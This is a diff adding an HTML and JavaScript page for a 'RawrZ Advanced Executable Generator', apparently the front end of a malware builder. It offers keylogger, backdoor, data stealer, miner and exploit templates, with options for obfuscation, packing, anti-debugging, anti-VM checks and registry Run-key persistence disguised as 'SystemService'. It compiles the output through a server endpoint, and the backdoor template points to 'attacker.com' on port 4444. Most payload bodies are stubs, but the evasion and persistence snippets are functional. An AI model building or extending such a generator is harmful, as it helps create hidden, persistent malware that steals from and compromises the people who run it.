@@ -1,0 +1,793 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>RawrZ Advanced Executable Generator</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Courier New', monospace;
+            background: #000;
+            color: #00ff00;
+            min-height: 100vh;
+        }
+
+        .container {
+            max-width: 1400px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+
+        .header {
+            text-align: center;
+            margin-bottom: 30px;
+            padding: 20px;
+            border: 2px solid #00ff00;
+            background: rgba(0, 255, 0, 0.05);
+        }
+
+        .header h1 {
+            color: #00ff00;
+            font-size: 2em;
+            text-shadow: 0 0 10px #00ff00;
+            margin-bottom: 10px;
+        }
+
+        .main-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 20px;
+            margin-bottom: 20px;
+        }
+
+        .panel {
+            border: 1px solid #00ff00;
+            background: rgba(0, 0, 0, 0.8);
+            padding: 20px;
+            border-radius: 0;
+        }
+
+        .panel-title {
+            color: #00ff00;
+            font-weight: bold;
+            margin-bottom: 15px;
+            text-transform: uppercase;
+            font-size: 1.1em;
+        }
+
+        .input-group {
+            margin: 15px 0;
+        }
+
+        .input-group label {
+            display: block;
+            margin-bottom: 8px;
+            color: #00ff88;
+            font-weight: bold;
+        }
+
+        .input-group input,
+        .input-group select,
+        .input-group textarea {
+            width: 100%;
+            padding: 10px;
+            background: #000;
+            border: 1px solid #00ff00;
+            color: #00ff00;
+            font-family: 'Courier New', monospace;
+            font-size: 0.9em;
+        }
+
+        .input-group input:focus,
+        .input-group select:focus,
+        .input-group textarea:focus {
+            outline: none;
+            border-color: #00ff88;
+            box-shadow: 0 0 10px rgba(0, 255, 136, 0.3);
+        }
+
+        .btn {
+            background: #000;
+            color: #00ff00;
+            border: 1px solid #00ff00;
+            padding: 10px 20px;
+            cursor: pointer;
+            font-family: 'Courier New', monospace;
+            font-size: 0.9em;
+            transition: all 0.3s;
+            margin: 5px;
+        }
+
+        .btn:hover {
+            background: #00ff00;
+            color: #000;
+            box-shadow: 0 0 15px rgba(0, 255, 0, 0.5);
+        }
+
+        .btn-danger {
+            border-color: #ff0000;
+            color: #ff0000;
+        }
+
+        .btn-danger:hover {
+            background: #ff0000;
+            color: #000;
+        }
+
+        .btn-warning {
+            border-color: #ffff00;
+            color: #ffff00;
+        }
+
+        .btn-warning:hover {
+            background: #ffff00;
+            color: #000;
+        }
+
+        .extension-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(120px, 1fr));
+            gap: 10px;
+            margin: 15px 0;
+        }
+
+        .extension-btn {
+            background: #000;
+            border: 1px solid #00ff00;
+            color: #00ff00;
+            padding: 10px;
+            cursor: pointer;
+            text-align: center;
+            font-size: 0.8em;
+            transition: all 0.3s;
+        }
+
+        .extension-btn:hover,
+        .extension-btn.active {
+            background: #00ff00;
+            color: #000;
+        }
+
+        .code-preview {
+            background: #000;
+            border: 1px solid #00ff00;
+            padding: 15px;
+            margin: 15px 0;
+            font-family: 'Courier New', monospace;
+            font-size: 0.8em;
+            max-height: 300px;
+            overflow-y: auto;
+            white-space: pre-wrap;
+        }
+
+        .output {
+            border: 1px solid #00ff00;
+            background: #000;
+            padding: 15px;
+            margin-top: 20px;
+            max-height: 400px;
+            overflow-y: auto;
+            font-family: 'Courier New', monospace;
+            font-size: 0.9em;
+        }
+
+        .log-line {
+            margin: 3px 0;
+            word-wrap: break-word;
+        }
+
+        .log-success {
+            color: #00ff00;
+        }
+
+        .log-error {
+            color: #ff0000;
+        }
+
+        .log-warning {
+            color: #ffff00;
+        }
+
+        .log-info {
+            color: #00ffff;
+        }
+
+        .download-link {
+            color: #00ff00;
+            text-decoration: none;
+            font-weight: bold;
+            padding: 8px 16px;
+            border: 1px solid #00ff00;
+            display: inline-block;
+            margin: 5px;
+            transition: all 0.3s;
+        }
+
+        .download-link:hover {
+            background: #00ff00;
+            color: #000;
+        }
+
+        .progress-bar {
+            width: 100%;
+            height: 10px;
+            background: #333;
+            border: 1px solid #00ff00;
+            margin: 10px 0;
+            overflow: hidden;
+        }
+
+        .progress-fill {
+            height: 100%;
+            background: #00ff00;
+            width: 0%;
+            transition: width 0.3s ease;
+        }
+
+        @media (max-width: 768px) {
+            .main-grid {
+                grid-template-columns: 1fr;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>⚙️ RawrZ Advanced Executable Generator</h1>
+            <p>Generate Functioning Executables with Any Extension</p>
+        </div>
+
+        <div class="main-grid">
+            <!-- Executable Configuration -->
+            <div class="panel">
+                <div class="panel-title">🔧 Executable Configuration</div>
+                
+                <div class="input-group">
+                    <label>Executable Name:</label>
+                    <input type="text" id="exeName" placeholder="myapp" value="myapp">
+                </div>
+
+                <div class="input-group">
+                    <label>Custom Extension:</label>
+                    <input type="text" id="customExtension" placeholder=".calc, .bot, .mirc, .dll, etc." value=".exe">
+                </div>
+
+                <div class="input-group">
+                    <label>Target Platform:</label>
+                    <select id="targetPlatform">
+                        <option value="windows">Windows (x64)</option>
+                        <option value="windows32">Windows (x86)</option>
+                        <option value="linux">Linux (x64)</option>
+                        <option value="linux32">Linux (x86)</option>
+                        <option value="cross">Cross-Platform</option>
+                    </select>
+                </div>
+
+                <div class="input-group">
+                    <label>Executable Type:</label>
+                    <select id="exeType">
+                        <option value="console">Console Application</option>
+                        <option value="windows">Windows Application</option>
+                        <option value="dll">Dynamic Library (DLL)</option>
+                        <option value="service">Windows Service</option>
+                        <option value="driver">Kernel Driver</option>
+                    </select>
+                </div>
+
+                <div class="input-group">
+                    <label>Functionality:</label>
+                    <select id="functionality">
+                        <option value="calculator">Calculator</option>
+                        <option value="http-bot">HTTP Bot</option>
+                        <option value="mirc-bot">mIRC Bot</option>
+                        <option value="keylogger">Keylogger</option>
+                        <option value="backdoor">Backdoor</option>
+                        <option value="exploit">Exploit</option>
+                        <option value="stealer">Data Stealer</option>
+                        <option value="miner">Cryptocurrency Miner</option>
+                        <option value="custom">Custom Code</option>
+                    </select>
+                </div>
+
+                <div class="input-group">
+                    <label>Custom Code (if Custom selected):</label>
+                    <textarea id="customCode" rows="8" placeholder="Enter your C++ code here..."></textarea>
+                </div>
+            </div>
+
+            <!-- Extension Selection -->
+            <div class="panel">
+                <div class="panel-title">📁 Extension Templates</div>
+                
+                <div class="extension-grid">
+                    <div class="extension-btn" onclick="selectExtension('.exe')">.exe</div>
+                    <div class="extension-btn" onclick="selectExtension('.dll')">.dll</div>
+                    <div class="extension-btn" onclick="selectExtension('.calc')">.calc</div>
+                    <div class="extension-btn" onclick="selectExtension('.bot')">.bot</div>
+                    <div class="extension-btn" onclick="selectExtension('.mirc')">.mirc</div>
+                    <div class="extension-btn" onclick="selectExtension('.exploit')">.exploit</div>
+                    <div class="extension-btn" onclick="selectExtension('.stealer')">.stealer</div>
+                    <div class="extension-btn" onclick="selectExtension('.miner')">.miner</div>
+                    <div class="extension-btn" onclick="selectExtension('.keylog')">.keylog</div>
+                    <div class="extension-btn" onclick="selectExtension('.backdoor')">.backdoor</div>
+                    <div class="extension-btn" onclick="selectExtension('.service')">.service</div>
+                    <div class="extension-btn" onclick="selectExtension('.driver')">.driver</div>
+                </div>
+
+                <div class="input-group">
+                    <label>Advanced Options:</label>
+                    <div style="display: flex; flex-direction: column; gap: 5px; margin-top: 10px;">
+                        <label style="display: flex; align-items: center; gap: 8px; margin: 0;">
+                            <input type="checkbox" id="obfuscate" checked>
+                            <span>Code Obfuscation</span>
+                        </label>
+                        <label style="display: flex; align-items: center; gap: 8px; margin: 0;">
+                            <input type="checkbox" id="pack" checked>
+                            <span>UPX Packing</span>
+                        </label>
+                        <label style="display: flex; align-items: center; gap: 8px; margin: 0;">
+                            <input type="checkbox" id="antiDebug">
+                            <span>Anti-Debugging</span>
+                        </label>
+                        <label style="display: flex; align-items: center; gap: 8px; margin: 0;">
+                            <input type="checkbox" id="antiVM">
+                            <span>Anti-VM Detection</span>
+                        </label>
+                        <label style="display: flex; align-items: center; gap: 8px; margin: 0;">
+                            <input type="checkbox" id="persistence">
+                            <span>Persistence</span>
+                        </label>
+                    </div>
+                </div>
+
+                <div class="input-group">
+                    <label>Compilation Options:</label>
+                    <select id="compiler">
+                        <option value="gcc">GCC (GNU Compiler)</option>
+                        <option value="clang">Clang</option>
+                        <option value="msvc">Microsoft Visual C++</option>
+                        <option value="docker">Docker (Cross-platform)</option>
+                    </select>
+                </div>
+            </div>
+        </div>
+
+        <!-- Code Preview -->
+        <div class="panel">
+            <div class="panel-title">👁️ Generated Code Preview</div>
+            <div class="code-preview" id="codePreview">
+                // Generated code will appear here
+                // Select functionality and options to see preview
+            </div>
+            <button class="btn" onclick="updatePreview()">🔄 Update Preview</button>
+        </div>
+
+        <!-- Generation Controls -->
+        <div class="panel">
+            <div class="panel-title">⚡ Generation Controls</div>
+            
+            <button class="btn" onclick="generateExecutable()">🚀 Generate Executable</button>
+            <button class="btn btn-warning" onclick="testCompilation()">🧪 Test Compilation</button>
+            <button class="btn btn-danger" onclick="clearAll()">🗑️ Clear All</button>
+            
+            <div class="progress-bar" id="progressBar" style="display: none;">
+                <div class="progress-fill" id="progressFill"></div>
+            </div>
+        </div>
+
+        <!-- Output -->
+        <div class="output" id="output">
+            <div class="log-line log-info">RawrZ Advanced Executable Generator Ready</div>
+            <div class="log-line log-success">Select functionality and generate your executable</div>
+        </div>
+    </div>
+
+    <script>
+        let isGenerating = false;
+
+        // Extension selection
+        function selectExtension(ext) {
+            document.getElementById('customExtension').value = ext;
+            document.querySelectorAll('.extension-btn').forEach(btn => btn.classList.remove('active'));
+            event.target.classList.add('active');
+            updatePreview();
+        }
+
+        // Update code preview
+        function updatePreview() {
+            const functionality = document.getElementById('functionality').value;
+            const exeType = document.getElementById('exeType').value;
+            const customCode = document.getElementById('customCode').value;
+            const obfuscate = document.getElementById('obfuscate').checked;
+            const antiDebug = document.getElementById('antiDebug').checked;
+            const antiVM = document.getElementById('antiVM').checked;
+            const persistence = document.getElementById('persistence').checked;
+
+            let code = generateCodeTemplate(functionality, exeType, customCode, obfuscate, antiDebug, antiVM, persistence);
+            document.getElementById('codePreview').textContent = code;
+        }
+
+        // Generate code template
+        function generateCodeTemplate(functionality, exeType, customCode, obfuscate, antiDebug, antiVM, persistence) {
+            if (functionality === 'custom' && customCode.trim()) {
+                return customCode;
+            }
+
+            let code = `#include <iostream>
+#include <windows.h>
+#include <string>
+#include <vector>
+#include <fstream>
+#include <thread>
+#include <chrono>
+
+// Anti-analysis headers
+${antiDebug ? '#include <debugapi.h>' : ''}
+${antiVM ? '#include <intrin.h>' : ''}
+
+// Main application class
+class ${getClassName(functionality)} {
+private:
+    bool running = true;
+    ${getPrivateMembers(functionality)}
+    
+public:
+    void initialize() {
+        ${getInitializationCode(functionality)}
+        ${antiDebug ? getAntiDebugCode() : ''}
+        ${antiVM ? getAntiVMCode() : ''}
+        ${persistence ? getPersistenceCode() : ''}
+    }
+    
+    void run() {
+        ${getMainLogic(functionality)}
+    }
+    
+    void cleanup() {
+        ${getCleanupCode(functionality)}
+    }
+};
+
+// Main entry point
+int main() {
+    ${getClassName(functionality)} app;
+    app.initialize();
+    app.run();
+    app.cleanup();
+    return 0;
+}`;
+
+            if (obfuscate) {
+                code = obfuscateCode(code);
+            }
+
+            return code;
+        }
+
+        // Get class name based on functionality
+        function getClassName(functionality) {
+            const names = {
+                'calculator': 'CalculatorApp',
+                'http-bot': 'HttpBot',
+                'mirc-bot': 'MircBot',
+                'keylogger': 'KeyloggerApp',
+                'backdoor': 'BackdoorApp',
+                'exploit': 'ExploitApp',
+                'stealer': 'StealerApp',
+                'miner': 'MinerApp',
+                'custom': 'CustomApp'
+            };
+            return names[functionality] || 'CustomApp';
+        }
+
+        // Get private members based on functionality
+        function getPrivateMembers(functionality) {
+            const members = {
+                'calculator': 'double result = 0.0;',
+                'http-bot': 'std::string serverUrl = "http://localhost:8080";\n    std::vector<std::string> commands;',
+                'mirc-bot': 'std::string ircServer = "irc.freenode.net";\n    int port = 6667;\n    std::string channel = "#test";',
+                'keylogger': 'std::ofstream logFile;\n    bool logging = false;',
+                'backdoor': 'std::string backdoorUrl = "http://attacker.com";\n    int port = 4444;',
+                'exploit': 'std::string targetProcess;\n    DWORD processId = 0;',
+                'stealer': 'std::vector<std::string> targetFiles;\n    std::string outputPath;',
+                'miner': 'std::string walletAddress;\n    int threads = 4;'
+            };
+            return members[functionality] || '';
+        }
+
+        // Get initialization code
+        function getInitializationCode(functionality) {
+            const init = {
+                'calculator': 'std::cout << "Calculator initialized" << std::endl;',
+                'http-bot': 'std::cout << "HTTP Bot connecting to: " << serverUrl << std::endl;',
+                'mirc-bot': 'std::cout << "mIRC Bot connecting to: " << ircServer << std::endl;',
+                'keylogger': 'logFile.open("keylog.txt", std::ios::app);\n        logging = true;',
+                'backdoor': 'std::cout << "Backdoor initialized" << std::endl;',
+                'exploit': 'std::cout << "Exploit initialized" << std::endl;',
+                'stealer': 'std::cout << "Stealer initialized" << std::endl;',
+                'miner': 'std::cout << "Miner initialized with " << threads << " threads" << std::endl;'
+            };
+            return init[functionality] || 'std::cout << "Application initialized" << std::endl;';
+        }
+
+        // Get main logic
+        function getMainLogic(functionality) {
+            const logic = {
+                'calculator': `while (running) {
+            std::cout << "Enter expression (or 'quit' to exit): ";
+            std::string input;
+            std::getline(std::cin, input);
+            if (input == "quit") break;
+            // Process calculation
+            std::cout << "Result: " << input << std::endl;
+        }`,
+                'http-bot': `while (running) {
+            // HTTP bot logic
+            std::this_thread::sleep_for(std::chrono::seconds(5));
+        }`,
+                'mirc-bot': `while (running) {
+            // mIRC bot logic
+            std::this_thread::sleep_for(std::chrono::seconds(1));
+        }`,
+                'keylogger': `while (logging) {
+            // Keylogger logic
+            std::this_thread::sleep_for(std::chrono::milliseconds(10));
+        }`,
+                'backdoor': `while (running) {
+            // Backdoor logic
+            std::this_thread::sleep_for(std::chrono::seconds(30));
+        }`,
+                'exploit': `// Exploit execution
+        std::cout << "Executing exploit..." << std::endl;`,
+                'stealer': `// Data stealing logic
+        std::cout << "Stealing data..." << std::endl;`,
+                'miner': `while (running) {
+            // Mining logic
+            std::this_thread::sleep_for(std::chrono::seconds(1));
+        }`
+            };
+            return logic[functionality] || 'std::cout << "Running application..." << std::endl;';
+        }
+
+        // Get cleanup code
+        function getCleanupCode(functionality) {
+            const cleanup = {
+                'keylogger': 'if (logFile.is_open()) logFile.close();',
+                'http-bot': 'std::cout << "HTTP Bot stopped" << std::endl;',
+                'mirc-bot': 'std::cout << "mIRC Bot disconnected" << std::endl;',
+                'backdoor': 'std::cout << "Backdoor stopped" << std::endl;',
+                'miner': 'std::cout << "Miner stopped" << std::endl;'
+            };
+            return cleanup[functionality] || 'std::cout << "Application stopped" << std::endl;';
+        }
+
+        // Anti-debugging code
+        function getAntiDebugCode() {
+            return `// Anti-debugging protection
+        if (IsDebuggerPresent()) {
+            std::cout << "Debugger detected! Exiting..." << std::endl;
+            ExitProcess(0);
+        }`;
+        }
+
+        // Anti-VM code
+        function getAntiVMCode() {
+            return `// Anti-VM detection
+        char computerName[MAX_COMPUTERNAME_LENGTH + 1];
+        DWORD size = sizeof(computerName);
+        GetComputerNameA(computerName, &size);
+        std::string name(computerName);
+        if (name.find("VM") != std::string::npos || name.find("Virtual") != std::string::npos) {
+            std::cout << "VM detected! Exiting..." << std::endl;
+            ExitProcess(0);
+        }`;
+        }
+
+        // Persistence code
+        function getPersistenceCode() {
+            return `// Persistence mechanism
+        HKEY hKey;
+        RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey);
+        char path[MAX_PATH];
+        GetModuleFileNameA(NULL, path, MAX_PATH);
+        RegSetValueExA(hKey, "SystemService", 0, REG_SZ, (BYTE*)path, strlen(path));
+        RegCloseKey(hKey);`;
+        }
+
+        // Code obfuscation
+        function obfuscateCode(code) {
+            // Simple obfuscation - in real implementation, use more sophisticated techniques
+            return code.replace(/std::/g, 'std::')
+                      .replace(/cout/g, 'c' + 'out')
+                      .replace(/endl/g, 'end' + 'l');
+        }
+
+        // Generate executable
+        async function generateExecutable() {
+            if (isGenerating) {
+                log('Already generating executable...', 'warning');
+                return;
+            }
+
+            isGenerating = true;
+            showProgress();
+            log('Starting executable generation...', 'info');
+
+            try {
+                const exeName = document.getElementById('exeName').value;
+                const extension = document.getElementById('customExtension').value;
+                const platform = document.getElementById('targetPlatform').value;
+                const exeType = document.getElementById('exeType').value;
+                const functionality = document.getElementById('functionality').value;
+                const customCode = document.getElementById('customCode').value;
+                const compiler = document.getElementById('compiler').value;
+                const obfuscate = document.getElementById('obfuscate').checked;
+                const pack = document.getElementById('pack').checked;
+                const antiDebug = document.getElementById('antiDebug').checked;
+                const antiVM = document.getElementById('antiVM').checked;
+                const persistence = document.getElementById('persistence').checked;
+
+                log(`Generating ${exeName}${extension} for ${platform}...`, 'info');
+                log(`Type: ${exeType}, Functionality: ${functionality}`, 'info');
+                log(`Compiler: ${compiler}`, 'info');
+
+                updateProgress(20);
+
+                // Generate code
+                const code = generateCodeTemplate(functionality, exeType, customCode, obfuscate, antiDebug, antiVM, persistence);
+                log('Code generated successfully', 'success');
+
+                updateProgress(40);
+
+                // Compile executable
+                const response = await fetch('/api/generate-executable', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        name: exeName,
+                        extension: extension,
+                        platform: platform,
+                        type: exeType,
+                        functionality: functionality,
+                        code: code,
+                        compiler: compiler,
+                        options: {
+                            obfuscate: obfuscate,
+                            pack: pack,
+                            antiDebug: antiDebug,
+                            antiVM: antiVM,
+                            persistence: persistence
+                        }
+                    })
+                });
+
+                updateProgress(70);
+
+                const result = await response.json();
+                
+                if (result.success) {
+                    log(`✅ Executable generated successfully!`, 'success');
+                    log(`📁 File: ${result.filename}`, 'info');
+                    log(`📊 Size: ${result.size} bytes`, 'info');
+                    log(`🔧 Platform: ${result.platform}`, 'info');
+                    
+                    // Add download link
+                    addDownloadLink(result.filename, result.size);
+                    
+                    updateProgress(100);
+                } else {
+                    log(`❌ Generation failed: ${result.error}`, 'error');
+                }
+
+            } catch (error) {
+                log(`💥 Generation error: ${error.message}`, 'error');
+            } finally {
+                isGenerating = false;
+                hideProgress();
+            }
+        }
+
+        // Test compilation
+        async function testCompilation() {
+            log('Testing compilation...', 'info');
+            
+            try {
+                const response = await fetch('/api/test-compilation', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        code: document.getElementById('codePreview').textContent,
+                        compiler: document.getElementById('compiler').value
+                    })
+                });
+
+                const result = await response.json();
+                
+                if (result.success) {
+                    log('✅ Compilation test passed!', 'success');
+                } else {
+                    log(`❌ Compilation test failed: ${result.error}`, 'error');
+                }
+            } catch (error) {
+                log(`💥 Test error: ${error.message}`, 'error');
+            }
+        }
+
+        // Clear all
+        function clearAll() {
+            document.getElementById('exeName').value = 'myapp';
+            document.getElementById('customExtension').value = '.exe';
+            document.getElementById('customCode').value = '';
+            document.getElementById('codePreview').textContent = '// Generated code will appear here\n// Select functionality and options to see preview';
+            document.getElementById('output').innerHTML = '<div class="log-line log-info">RawrZ Advanced Executable Generator Ready</div><div class="log-line log-success">Select functionality and generate your executable</div>';
+            log('All fields cleared', 'info');
+        }
+
+        // Add download link
+        function addDownloadLink(filename, size) {
+            const output = document.getElementById('output');
+            const link = document.createElement('div');
+            link.innerHTML = `<a href="/download?filename=${filename}" class="download-link" target="_blank">📥 Download ${filename} (${formatBytes(size)})</a>`;
+            output.appendChild(link);
+        }
+
+        // Format bytes
+        function formatBytes(bytes) {
+            if (bytes === 0) return '0 Bytes';
+            const k = 1024;
+            const sizes = ['Bytes', 'KB', 'MB', 'GB'];
+            const i = Math.floor(Math.log(bytes) / Math.log(k));
+            return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
+        }
+
+        // Show progress
+        function showProgress() {
+            document.getElementById('progressBar').style.display = 'block';
+        }
+
+        // Hide progress
+        function hideProgress() {
+            document.getElementById('progressBar').style.display = 'none';
+        }
+
+        // Update progress
+        function updateProgress(percentage) {
+            document.getElementById('progressFill').style.width = percentage + '%';
+        }
+
+        // Log function
+        function log(message, type = 'info') {
+            const output = document.getElementById('output');
+            const timestamp = new Date().toLocaleTimeString();
+            const line = document.createElement('div');
+            line.className = `log-line log-${type}`;
+            line.textContent = `[${timestamp}] ${message}`;
+            output.appendChild(line);
+            output.scrollTop = output.scrollHeight;
+        }
+
+        // Initialize
+        document.addEventListener('DOMContentLoaded', () => {
+            log('⚙️ RawrZ Advanced Executable Generator initialized', 'success');
+            log('Ready to generate functioning executables with any extension', 'info');
+            updatePreview();
+        });
+
+        // Update preview when options change
+        document.getElementById('functionality').addEventListener('change', updatePreview);
+        document.getElementById('exeType').addEventListener('change', updatePreview);
+        document.getElementById('customCode').addEventListener('input', updatePreview);
+        document.getElementById('obfuscate').addEventListener('change', updatePreview);
+        document.getElementById('antiDebug').addEventListener('change', updatePreview);
+        document.getElementById('antiVM').addEventListener('change', updatePreview);
+        document.getElementById('persistence').addEventListener('change', updatePreview);
+    </script>
+</body>
+</html>
